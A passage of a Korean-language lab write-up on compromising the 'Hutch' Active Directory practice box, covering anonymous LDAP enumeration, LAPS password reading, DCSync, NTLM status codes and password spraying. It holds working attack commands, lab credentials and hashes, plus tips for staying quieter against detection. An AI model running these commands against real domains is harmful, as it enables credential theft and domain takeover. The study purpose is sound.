> **접힘을 «애초에 끄는» 법** — OpenLDAP `ldapsearch` 의 `-o` 옵션이다(실측, `ldapsearch -h`):
> ```
> -o <opt>[=<optparam>] any libldap ldap.conf options, plus
>            ldif_wrap=<width> (in columns, or "no" for no wrapping)
> ```
> ```bash
> ldapsearch -o ldif_wrap=no -x -H ldap://<IP> -b '<baseDN>' \
>   '(objectClass=user)' sAMAccountName description | grep -i description
> ```
> **하이픈이 아니라 밑줄(`ldif_wrap`)이다.** 이미 접힌 출력을 사후에 펴려면 `sed -e ':a' -e '$!N;s/\n //;ta' -e 'P;D'`.
> 또한 값이 `description::` 처럼 **콜론 두 개**로 나오면 **base64**다(비-ASCII가 섞였다는 뜻) — `base64 -d` 해야 읽힌다.

> [!danger] AD에서 «평문 비밀번호가 자주 발견되는» 속성 — 전부 훑어라
> | 속성 | 왜 위험한가 |
> |---|---|
> | `description` | **인증된 사용자 전원이 읽는다.** 이 박스와 [[Resourced]] 둘 다 |
> | `info` (=Notes 탭) | 같은 이유. `description`보다 길게 쓸 수 있어 더 자주 털린다 |
> | `comment` | 로컬 계정 쪽 |
> | `userPassword`·`unixUserPassword` | 유닉스 연동 시 **평문으로 들어가는 경우가 있다** |
> | `ms-Mcs-AdmPwd` | **LAPS 평문**(§2-4) |
> | `msDS-ManagedPassword` | gMSA |
> | SYSVOL의 `Groups.xml` `cpassword` | GPP. **AES 키가 공개돼 있어 복호화된다** |
>
> nxc 모듈로 한 번에(실측 — `nxc ldap -L` 목록에 등재돼 있다):
> ```
> [*] get-desc-users        Get description of the users. May contained password
> [*] user-desc             Get user descriptions stored in Active Directory
> [*] get-userPassword      Get userPassword attribute from all users in ldap
> [*] get-unixUserPassword  Get unixUserPassword attribute from all users in ldap
> [*] laps                  Retrieves all LAPS passwords which the account has read permissions for
> ```

### 2-3. LAPS — 무엇이고, 왜 «읽기 권한»이 곧 관리자 권한인가

**LAPS(Local Administrator Password Solution)** 는 각 컴퓨터의 로컬 관리자 비밀번호를 **주기적으로 랜덤 생성**해 **AD의 컴퓨터 객체 속성에 저장**하는 마이크로소프트 솔루션이다. 목적은 "모든 PC의 로컬 관리자 비밀번호가 같아서 한 대가 털리면 전부 털리는" 문제(Pass-the-Hash 횡적 이동)를 없애는 것이다.

| 세대 | 비밀번호 속성 | 만료 속성 | 비고 |
|---|---|---|---|
| **1세대 LAPS**(별도 설치, 이 박스) | **`ms-Mcs-AdmPwd`** | `ms-Mcs-AdmPwdExpirationTime` | **평문으로 저장된다.** 스키마 확장 필요 |
| **Windows LAPS**(2023~, OS 내장) | `msLAPS-Password` / `msLAPS-EncryptedPassword` | `msLAPS-PasswordExpirationTime` | 암호화 저장 지원 |

**이 박스가 1세대라는 근거**는 실제로 쓴 도구의 소스다 — `~/git/pyLAPS/pyLAPS.py` 를 열어 보면:

```python
# pyLAPS.py:312
'(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=%s))' % escape_filter_chars(sAMAccountName),
# pyLAPS.py:313
attributes=['sAMAccountName', 'objectSid', 'ms-Mcs-AdmPwd']
```

> [!danger] **`ms-Mcs-AdmPwd` 는 평문이다. 보호 장치는 «암호화»가 아니라 «ACL» 하나뿐이다**
> 이 속성에는 비밀번호가 **그대로** 들어 있다. 아무나 못 읽는 이유는 **속성 수준 ACL**로 보호되기 때문이다 — LAPS 설치 시 `Set-AdmPwdReadPasswordPermission` 으로 **읽을 수 있는 주체를 명시적으로 지정**한다.
> 따라서 **그 ACL에 잘못된 주체가 들어가는 순간, 그 주체는 해당 컴퓨터의 관리자다.** 익스플로잇도, 크랙도, 페이로드도 필요 없다. **속성 하나를 읽으면 끝이다.**
> BloodHound는 이 권한을 **`ReadLAPSPassword`** 엣지로 표시한다. **이 엣지를 보면 즉시 §4-2로 직행하라.**

BloodHound 덤프에서 그 ACE를 직접 확인한다:

```bash
$ jq -r '.data[] | .Properties.name as $n | .Aces[]? | "\($n) <= \(.PrincipalSID) \(.PrincipalType) \(.RightName)"' \
    20260515132325_computers.json
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-512  Group Owns
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-512  Group GenericAll
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-512  Group ReadLAPSPassword          # Domain Admins (정상)
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-1115 User  ReadLAPSPassword          # ★ fmcsorley (오설정)
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-526  Group AddKeyCredentialLink
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-527  Group AddKeyCredentialLink
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-519  Group GenericAll                # Enterprise Admins
HUTCHDC.HUTCH.OFFSEC <= ...-S-1-5-32-544  Group GenericWrite/WriteOwner/WriteDacl

$ jq -r '.data[] | {name:.Properties.name, laps:.Properties.haslaps}' 20260515132325_computers.json
{ "name": "HUTCHDC.HUTCH.OFFSEC", "laps": true }
```

**RID 1115 = `fmcsorley`** — §2-2에서 비밀번호가 노출된 바로 그 계정이다. 그리고 **`haslaps: true`** 로 LAPS 배포가 확인된다.

> [!note] `ReadLAPSPassword` ACE는 실제로 무엇인가
> DACL 수준에서는 **`ControlAccess`(확장 권한) 또는 `ReadProperty`(속성 읽기)** 가 `ms-Mcs-AdmPwd` 속성 집합에 걸린 형태다. BloodHound가 그것을 사람이 읽을 수 있게 `ReadLAPSPassword`로 이름 붙인 것뿐이다.
> **그래서 `GenericAll`을 가진 주체도 자동으로 LAPS를 읽을 수 있다** — 위 출력에서 Domain Admins가 `GenericAll`과 `ReadLAPSPassword`를 둘 다 갖는 것으로 보이는 이유다.

### 2-4. **왜 DC의 LAPS 비밀번호가 «도메인» Administrator의 것이었는가** — 해시로 증명한다

이 박스에서 가장 중요한 인과이고, 이 노트가 **직접 계산해 확정**한 부분이다.

pyLAPS로 얻은 값은 `+CS0-.gm5l4o-[` 이고(§4-2), 그것으로 **도메인** 인증이 통했다(`-d hutch.offsec` → `(Pwn3d!)`). 그런데 LAPS는 원래 **로컬** 관리자 비밀번호를 관리한다. 어느 쪽인가?

NT 해시는 `MD4(UTF-16LE(비밀번호))` 이므로 **직접 계산해 §4-4의 덤프와 대조**하면 된다. 2026-08-20 Kali에서 실행:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -c "
import hashlib
pw = '+CS0-.gm5l4o-['
print(hashlib.new('md4', pw.encode('utf-16le')).hexdigest())"
d1722dc7b059af8df626c88ee2d279e4
```

**대조 결과**

| 계정 | §4-4 덤프의 NT 해시 | LAPS 비밀번호의 해시와 일치? |
|---|---|---|
| **도메인** `Administrator` (DRSUAPI 구간, RID 500) | `d1722dc7b059af8df626c88ee2d279e4` | **✔ 완전 일치** |
| **로컬 SAM** `Administrator` (SAM 구간, RID 500) | `bab179eba40e413086aa37742476c646` | ✘ 불일치 |

**확정: `ms-Mcs-AdmPwd` 에 들어 있던 값은 «도메인» Administrator의 비밀번호였다.**

> [!note] 도메인 컨트롤러에는 **«보통 의미의» 로컬 계정이 없다**
> DC로 승격되면 로컬 SAM 데이터베이스는 사실상 폐기되고, `Administrator`는 **도메인 계정**이 된다. SAM에 남는 RID 500 계정은 **DSRM(Directory Services Restore Mode) 계정** — 안전모드 복구용이며 평상시 로그온에 쓰이지 않는다.
> 위 표의 `bab179eb…` 가 바로 그 **DSRM 계정 해시**이고, `d1722dc7…` 와 다른 것이 정상이다.
> **[가정]** 그러므로 "DC에 LAPS가 배포됐다"는 상황 자체가 **비정상적인 구성**이며, 이 랩은 그 결과 **도메인 Administrator의 비밀번호가 LAPS 속성에 들어가도록** 만들어져 있다. 실제로 DC 측에서 어떤 방식으로 그렇게 됐는지(LAPS CSE 동작인지 랩 제작자의 수동 설정인지)는 **DC 내부를 볼 수 없어 확인하지 못했다.** 확정된 것은 **위 해시 일치**뿐이다.
>
> **실전 교훈**: LAPS 값을 얻으면 **로컬 인증(`--local-auth`)과 도메인 인증을 «둘 다» 시도하라.** 어느 쪽이 통할지는 대상이 DC인지 멤버 서버인지에 달렸다.

### 2-5. DCSync(DRSUAPI) — [[Resourced]]와 정확히 무엇이 다른가

도메인 관리자를 얻은 뒤 `secretsdump`를 **네트워크 대상**으로 돌리면 출력에 이 줄이 나온다:

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

**이 한 줄이 DCSync의 표식이다.** [[Resourced]]의 오프라인 파싱 출력에는 이 줄이 **없다**(대신 `Searching for pekList` / `Reading and decrypting hashes from ntds.dit` 가 나온다). 두 노트를 나란히 놓고 이 차이를 보면 기법 구분이 몸에 붙는다.

> [!note] DCSync가 호출하는 것 — **`DRSUAPI` / `IDL_DRSGetNCChanges`**
> AD는 DC끼리 디렉터리를 복제할 때 **MS-DRSR**(Directory Replication Service Remote Protocol)을 쓴다. 그 핵심 RPC가 **`IDL_DRSGetNCChanges`** 이고, "이 네이밍 컨텍스트에서 변경된 개체를 달라"는 요청이다. 응답에는 **`unicodePwd`·`supplementalCredentials` 같은 비밀 속성이 포함**된다 — 복제란 원래 그런 것이기 때문이다.
> **DCSync는 «DC인 척»하며 이 RPC를 부르는 것**이다. 익스플로잇이 아니라 **정상 기능의 오용**이다. 그래서 패치로 막히지 않는다.
>
> **왜 특정 권한을 요구하는가** — DC는 호출자가 복제 권한을 가졌는지 확인한다. 필요한 **확장 권한(Control Access Right)** 은 도메인 개체의 DACL에 걸린 다음 셋이다:
>
> | 확장 권한 | GUID | 역할 |
> |---|---|---|
> | **DS-Replication-Get-Changes** | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | 일반 속성 복제 |
> | **DS-Replication-Get-Changes-All** | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | **비밀 속성(해시) 포함.** 이게 없으면 해시가 안 온다 |
> | DS-Replication-Get-Changes-In-Filtered-Set | `89e95b76-444d-4c62-991a-0facbeda640c` | RODC 필터 집합 |
>
> 기본적으로 **Domain Admins·Enterprise Admins·Administrators·Domain Controllers** 가 이것을 갖는다. 우리는 **Administrator로 인증**했으므로 조건이 충족된다.
> **일반화**: BloodHound에서 `DCSync` 엣지가 보이면 **그 계정은 이미 도메인 전체를 소유한 것**이다. 관리자 그룹 멤버가 아니어도 이 두 확장 권한만 있으면 된다 — **실전에서 백도어로 심어 두는 전형적 수법**이다.

> [!warning] DCSync는 «시끄럽다» — 흔적을 알고 써라
> - **이벤트 4662**(개체에 대한 오퍼레이션)에 위 GUID가 그대로 찍힌다. 성숙한 SOC의 표준 탐지 규칙이다
> - `secretsdump`가 **원격 레지스트리로 SAM/LSA를 먼저 뜨기 때문에** `RemoteRegistry` 서비스를 시작시킨다 — §6-5의 흔적
> - **`-just-dc-ntlm` 을 쓰면** SAM/LSA 단계를 건너뛰고 NTDS만 받아 **훨씬 조용하다**:
>   ```bash
>   impacket-secretsdump 'hutch.offsec/administrator:<pass>@<IP>' -just-dc-ntlm
>   impacket-secretsdump 'hutch.offsec/administrator:<pass>@<IP>' -just-dc-user krbtgt   # 한 계정만
>   ```

### 2-6. 비밀번호 스프레이가 프로토콜 수준에서 무엇을 하는가 — `STATUS_*` 사전

이 박스는 **처음부터 끝까지 NTLM** 이다. Kerberos 인증은 한 번도 쓰지 않았다(kerbrute는 «인증»이 아니라 에러 코드 관찰이다 — §1-4). 그래서 스프레이 응답을 읽는 능력이 그대로 진행 속도가 된다.

`nxc smb` 가 각 시도마다 하는 일은 **SMB 세션 설정 → NTLM 3단 챌린지-응답 → 서버의 NTSTATUS 확인**이다.

```
클라이언트                                              DC
    │ ① NEGOTIATE_MESSAGE                              │
    ├─────────────────────────────────────────────────►│
    │ ② CHALLENGE_MESSAGE  (서버 논스 8바이트)          │
    │◄─────────────────────────────────────────────────┤
    │ ③ AUTHENTICATE_MESSAGE                           │
    │     NTOWFv2  = HMAC-MD5(NT해시, UPPER(user)+domain)
    │     NTv2Resp = HMAC-MD5(NTOWFv2, 챌린지 ‖ blob)   │
    ├─────────────────────────────────────────────────►│
    │ ④ SESSION_SETUP 응답 = «NTSTATUS»                 │
    │◄─────────────────────────────────────────────────┤
```

**④의 NTSTATUS가 전부다.** nxc가 `[-] ... STATUS_XXX` 로 보여주는 것이 이 값이다.

| NTSTATUS | 자격증명이 맞았나 | 무엇을 뜻하나 | 다음 수 |
|---|---|---|---|
| **(성공)** `[+]` | ✔ | 세션 확립 | 바로 진행 |
| `STATUS_LOGON_FAILURE` | ✘ | **비밀번호/해시가 틀렸다.** 이 박스 스프레이의 대부분 | 다음 후보 |
| `STATUS_ACCOUNT_DISABLED` | ✔ | 맞지만 **계정이 비활성** | 활성화 권한이 생기면 재시도 |
| **`STATUS_PASSWORD_EXPIRED`** | **✔** | **맞다.** 만료돼서 세션만 못 준다 | **RDP로 로그인해 비밀번호 변경** · `net rpc password` — [[Resourced]] §2-4가 이 경우다 |
| `STATUS_PASSWORD_MUST_CHANGE` | **✔** | 맞다. `pwdLastSet=0`(최초 로그온 변경 강제) | 위와 동일 |
| `STATUS_ACCOUNT_LOCKED_OUT` | 판정 불가 | **잠겼다.** 스프레이가 임계값을 넘겼다는 신호 | **즉시 중단.** 더 하면 나머지도 잠근다 |
| `STATUS_ACCOUNT_RESTRICTION` | ✔ | 맞지만 **로그온 시간·워크스테이션 제한** | 다른 프로토콜/시간대 |
| `STATUS_NOT_SUPPORTED` / `STATUS_LOGON_TYPE_NOT_GRANTED` | ✔ | 맞지만 **그 로그온 유형이 거부**됨 | WinRM 대신 SMB 등 채널 변경 |

> [!danger] **«맞았는데 실패로 보이는» 상태가 넷이나 된다**
> `PASSWORD_EXPIRED`·`MUST_CHANGE`·`ACCOUNT_RESTRICTION`·`LOGON_TYPE_NOT_GRANTED` 는 전부 **`[-]` 로 출력되지만 자격증명은 정확하다.**
> **`[-]` 만 보고 넘기면 정답을 버린다.** 반드시 **상태 문자열까지 읽어라.**
> ```bash
> nxc smb <IP> -u users.txt -p '<pass>' --continue-on-success | grep -vE "STATUS_LOGON_FAILURE"
> ```
> 이 한 줄이 «진짜 실패»만 걸러낸다. [[Resourced]]는 이 구분이 박스 전체의 분기점이었다.

> [!note] 이 박스는 왜 **`--local-auth` 가 아니라 `-d hutch.offsec`** 이었나
> NTLM의 ③에서 `NTOWFv2` 계산에 **도메인 문자열이 «키의 일부»로 들어간다**(`HMAC-MD5(NT해시, UPPER(user) + domain)`). 즉 **같은 비밀번호라도 도메인이 다르면 응답값이 다르다.**
> - `-d hutch.offsec` → 도메인 계정 데이터베이스(NTDS)에서 검증
> - `--local-auth` → **로컬 SAM**에서 검증. 도메인 부분에 **컴퓨터 이름**이 들어간다
>
> DC에서 이 둘은 **완전히 다른 계정**을 가리킨다(§2-4의 해시 대조가 그것을 증명한다 — `d1722dc7…` vs `bab179eb…`).
> **LAPS 평문을 얻으면 둘 다 시도하라.** 멤버 서버라면 `--local-auth` 가, DC라면 도메인 인증이 통한다.

> [!tip] Kerberos 쪽 인증·티켓 유통은 [[Resourced]] **§2-8** 에 정리했다
> 이 박스는 Kerberos 인증 경로를 쓰지 않았지만, **시험 AD 세트에서는 NTLM이 막힌 도메인을 만난다.** 그때 필요한 것이 `getTGT` → `KRB5CCNAME` → `-k -no-pass` 사슬이다.
> §4-4의 덤프에서 **`aes256-cts-hmac-sha1-96` 키를 함께 챙겨 둔 이유**가 그것이다 — RC4가 정책으로 꺼진 도메인에서는 NT 해시가 무용지물이고 AES 키만 통한다.

### 2-7. 자격증명 없는 열거 채널은 셋이다 — 어느 하나가 막혀도 나머지를 쳐라

이 박스가 LDAP으로 뚫렸고 [[Resourced]]가 SMB로 뚫렸다는 사실이 정확히 이 교훈이다. **두 박스의 BloodHound 덤프가 «왜 채널이 달랐는지»를 직접 증명한다.**

| 채널 | 포트 | 도구 | Hutch | Resourced |
|---|---|---|---|---|
| **LDAP 익명 바인드** | 389 / 3268 | `ldapsearch -x` · `nxc ldap` | **✔ 성공** — 사용자 14명 + `description` | 시도 기록 없음 |
| **SMB 널 세션 (SAMR/LSARPC)** | 445 | `nxc smb --users` · `rpcclient -U '' -N` · `enum4linux-ng` | 시도 기록 없음 | **✔ 성공** — 사용자 13명 + `description` |
| **RID 사이클링 (LSARPC)** | 445 | `impacket-lookupsid` | — | — |

**두 도메인의 `Pre-Windows 2000 Compatible Access` 멤버가 다르다** — 이것이 SMB 채널의 개폐를 가른다:

```bash
# Resourced — ANONYMOUS LOGON 이 들어 있다 → 널 세션 SAMR 열거가 된다
"members": [ "RESOURCED.LOCAL-S-1-5-7 Group",     ← S-1-5-7 = ANONYMOUS LOGON
             "RESOURCED.LOCAL-S-1-5-11 Group" ]   ← S-1-5-11 = Authenticated Users

# Hutch — Authenticated Users «만» 있다 → 이 경로로는 널 세션 열거가 안 된다
"members": [ "HUTCH.OFFSEC-S-1-5-11 Group" ]
```

> [!danger] **한 채널이 막혔다고 «익명 열거가 안 된다»고 결론내지 마라**
> Hutch는 SMB 쪽 관대한 설정이 **없는데도** LDAP이 열려 있었다. 두 설정은 **서로 독립**이다:
> - SMB 널 세션 = `Pre-Windows 2000 Compatible Access` 멤버십 + `RestrictAnonymous`/`RestrictAnonymousSAM`
> - 익명 LDAP = `dSHeuristics` 의 `fLDAPBlockAnonOps` 비트 (+ 개체 DACL)
>
> **그러므로 자격증명 없이 DC를 만나면 «셋 다» 던진다.** 전부 합쳐 1분이다:
> ```bash
> # ① SMB 널 세션
> nxc smb <IP> --users --shares --pass-pol
> rpcclient -U '' -N <IP> -c 'enumdomusers;enumdomgroups;querydominfo'
> enum4linux-ng -A <IP>
>
> # ② 익명 LDAP  (RootDSE 는 «거의 항상» 열려 있다 → baseDN 을 먼저 얻는다)
> ldapsearch -x -H ldap://<IP> -s base namingcontexts
> ldapsearch -o ldif_wrap=no -x -H ldap://<IP> -b '<baseDN>' '(objectClass=user)' sAMAccountName description
> nxc ldap <IP> -u '' -p '' --users
>
> # ③ RID 사이클링 (①②가 막혀도 «게스트/널»이 조금이라도 되면 통한다)
> impacket-lookupsid '<domain>/guest'@<IP> -no-pass 20000
> ```
> **③은 특히 과소평가된다** — SAMR 열거가 막혀도 LSARPC의 SID→이름 변환은 열려 있는 경우가 있다. RID 500부터 순회하면 관리자 계정명까지 나온다.

> [!note] RootDSE만 열려 있고 서브트리가 막혔을 때 — 그래도 얻는 것이 있다
> 익명 서브트리 조회가 `result: 1 Operations error` 로 막혀도 **§1-2의 RootDSE는 거의 항상 읽힌다.** 거기서 얻는 `defaultNamingContext`·`dnsHostName`·`domainFunctionality` 만으로도 `/etc/hosts` 등록과 이후 모든 인증 시도의 **전제 조건이 갖춰진다.**
> **"익명이 막혔다"와 "아무것도 못 얻는다"는 다르다.**

### 2-8. 이 도메인의 결함은 «셋이 겹친» 것이다 — 하나만 막혔어도 안 뚫렸다

이 박스를 뚫은 것은 취약점 하나가 아니라 **독립된 비밀번호 관리 실패 셋의 연쇄**다. 각각이 다음 단계의 «전제»가 된다.

| # | 결함 | 없었다면 | 근거 |
|---|---|---|---|
| ① | **익명 LDAP 서브트리 조회 허용** | 사용자 목록도 `description`도 못 얻는다. **박스가 시작조차 안 된다** | §1-3 |
| ② | **`description` 에 평문 비밀번호** | 스프레이할 후보가 없다. §3-1의 사용자명 스프레이는 **실제로 전멸했다** | §2-2·§3-1 |
| ③ | **`fmcsorley` 에게 DC의 LAPS 읽기 권한** | `fmcsorley`는 공유도 못 읽는 평범한 사용자다(§3-3). **거기서 끝난다** | §2-3 |

여기에 **네 번째 결함**이 덤프에서 드러난다 — 풀이에는 쓰이지 않았지만 **더 심각한 것**이다.

> [!danger] **사용자 12명의 NT 해시가 전부 같다** — §4-4 덤프가 보여주는 «네 번째» 결함
> RID 1103~1114(`rplacidi`…`agitthouse`)가 전원 **`c11f1141ab4c1e825a11f15836e6978f`** 다. 즉 **12명이 같은 비밀번호를 쓴다.**
> `fmcsorley`(1115)만 다른 이유는 §2-2의 `description` 그대로다 — **"사용자 요청으로 비밀번호를 재설정했다"**. **설명 필드가 사실이었음이 해시로 교차 검증된다.**
>
> **공격자 관점에서 이것이 뜻하는 것**:
> - **하나만 크랙하면 12명분 평문**을 얻는다
> - **크랙조차 필요 없다** — 해시 그대로 12명 전원에게 PtH가 된다
> - **만약 §3-1의 사용자명 스프레이 대신 흔한 비밀번호를 뿌렸다면**, `description`을 찾기 «전에» foothold를 잡았을 가능성이 있다. **[가정]** — 그 비밀번호가 무엇이었는지는 크랙하지 않아 모른다
>
> **덤프를 받으면 반드시 돌릴 한 줄**:
> ```bash
> cut -d: -f4 dump.txt | sort | uniq -c | sort -rn | head
> ```
> 같은 해시가 뭉쳐 있으면 **대량 계정 생성 시 초기 비밀번호를 동일하게 준 것**이고, 그 조직 전체의 패턴이다. **다른 박스·다른 도메인으로 재사용될 값**이므로 시험 AD 세트에서는 특히 중요하다.
>
> 참고로 `31d6cfe0d16ae931b73c59d7e0c089c0` 이 보이면 그건 **빈 비밀번호의 NT 해시**다 — 이 덤프에서는 `Guest`·`DefaultAccount`가 그렇다. **외워 둘 상수다.**

---

## 3. Foothold — 비밀번호 스프레이

### 3-1. 먼저 시도한 것 — 사용자명 = 비밀번호

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ nxc smb 192.168.216.122 -u users.txt -p users.txt --continue-on-success --ignore-pw-decoding
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\opatry:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\acostello:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\oknee:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\avictoria:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\cluddy:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\fmcsorley:Guest STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:rplacidi STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:rplacidi STATUS_LOGON_FAILURE 
<SNIP>
```

> [!danger] **이 명령은 «전조합 스프레이» 다 — 계정을 잠글 수 있는 위험한 실행이었다**
> `-u 파일 -p 파일` 을 주면 nxc의 **기본 동작은 14 × 14 = 196회 전조합 시도**다. 출력이 그것을 증명한다 — `Guest:Guest` 다음이 `rplacidi:Guest`(비밀번호 고정, 사용자 순회)이고, 14명을 돈 뒤 비밀번호가 `rplacidi`로 바뀐다.
> **각 사용자가 «14회» 실패한다.** `Account lockout threshold`가 5나 10으로 설정돼 있었다면 **도메인 전 계정이 잠겼을 것**이고, 리버트 말고는 복구 방법이 없었다.
> **이 박스는 잠금 정책이 없어서 살았다. 운이었다.**
>
> **반사 셋**:
> 1. **스프레이 전에 잠금 정책을 확인한다** — `nxc smb <IP> -u <user> -p <pass> --pass-pol` (자격증명 하나는 필요하다). 익명이 되면 `enum4linux-ng -P <IP>`
> 2. **행 단위 짝짓기를 원하면 `--no-bruteforce`** — `--help` 원문: *"No spray when using file for username and password (user1 => password1, user2 => password2)"*
> 3. **진짜 스프레이는 «비밀번호 하나 × 사용자 전원»** 으로, **잠금 관찰 창(보통 30분)마다 한 번씩** 돌린다. 사용자당 시도 횟수를 1로 유지하는 것이 핵심이다
>
> `--ignore-pw-decoding` 은 *"Ignore non UTF-8 characters when decoding the password file"* 다(실측). **`-p` 가 파일일 때만 의미가 있고**, §3-2처럼 리터럴 문자열이면 아무 일도 하지 않는다.

### 3-2. `description` 에서 얻은 비밀번호로 스프레이

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ nxc smb 192.168.216.122 -u users.txt -p "CrabSharkJellyfish192" --continue-on-success --ignore-pw-decoding  
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\Guest:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\rplacidi:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\opatry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\ltaunton:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\acostello:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jsparwell:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\oknee:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jmckendry:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\avictoria:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\jfrarey:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\eaburrow:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\cluddy:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [-] hutch.offsec\agitthouse:CrabSharkJellyfish192 STATUS_LOGON_FAILURE 
SMB         192.168.216.122 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
```

**`fmcsorley:CrabSharkJellyfish192`** 확보.

> [!tip] 왜 «비밀번호가 적힌 그 사람» 말고 전원에게 뿌렸는가 — 옳은 판단이다
> `description`은 `fmcsorley`의 것이었지만, 그 사실은 **BloodHound를 돌린 «뒤에» 확정**됐다. `grep description:` 만으로는 **어느 개체의 속성인지 알 수 없다**(LDIF에서 `dn:` 줄이 따로 떨어져 있고 grep이 그것을 버렸다).
> 그래서 **전원 스프레이가 정보 부족 상태에서의 정답**이다. 비용은 사용자당 1회 — 잠금 정책이 정상이라면 안전한 수준이다.
> **더 나은 방법**은 처음부터 `dn`과 `description`을 짝지어 뽑는 것이다:
> ```bash
> ldapsearch -x -H ldap://<IP> -b '<baseDN>' '(objectClass=user)' sAMAccountName description \
>   | sed -e ':a' -e '$!N;s/\n //;ta' -e 'P;D' \
>   | grep -A1 -i 'sAMAccountName'
> ```
> **`[-]` 가 «STATUS_LOGON_FAILURE» 뿐인 것도 정보다** — 잠김(`STATUS_ACCOUNT_LOCKED_OUT`)이나 만료(`STATUS_PASSWORD_EXPIRED`)가 하나도 없다. §3-1의 196회 시도가 **아무 계정도 잠그지 않았음**이 여기서 확인된다.

### 3-3. 확보 후 공유 점검 — 소득 없음

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ smbmap -H 192.168.216.122 -u fmcsorley -p CrabSharkJellyfish192
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] IP: 192.168.216.122:445     Name: 192.168.216.122           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```

**기본 공유뿐이다.** [[Resourced]]의 `Password Audit` 같은 비표준 공유가 없다 — 이 박스는 **SMB 경로가 아니라는 것**이 여기서 확정된다.

> [!tip] 그래도 `SYSVOL` 은 **반드시** 뒤져라
> READ ONLY라도 `SYSVOL`에는 GPP `cpassword`(`Groups.xml`·`Services.xml`·`ScheduledTasks.xml`)와 로그온 스크립트 안의 평문이 있을 수 있다.
> ```bash
> nxc smb <IP> -u U -p P -M gpp_password
> nxc smb <IP> -u U -p P -M gpp_autologin
> # 수동
> smbclient '//<IP>/SYSVOL' -U 'U%P' -c 'recurse on; prompt off; mget *'
> grep -ri cpassword .
> ```
> 이 박스에서는 소득이 없었지만, **비용 2분에 회수가 «도메인 관리자»** 인 조사다.

---

## 4. 권한상승

### 4-1. BloodHound

```bash
